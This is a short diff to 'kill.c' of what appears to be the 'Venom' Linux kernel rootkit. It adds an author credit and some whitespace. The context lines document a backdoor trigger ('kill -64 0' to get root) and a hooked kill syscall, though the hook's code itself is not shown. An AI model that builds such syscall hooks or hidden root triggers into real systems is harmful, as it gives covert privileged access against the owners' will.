@@ -1,4 +1,4 @@
-/*
+/* 
  * Venom 
  * ---------------------------------------------------------------------------
  * File: kill.c
@@ -9,6 +9,8 @@
  *
  * Contents (documentation-only):
  *  - Get root privileges: kill -64 0 
+ * 
+ * Author: Trevohack 
  */
 
 
@@ -92,4 +94,5 @@ notrace static asmlinkage long hooked_kill(const struct pt_regs *regs) {
 }
 
 #endif 
+
 
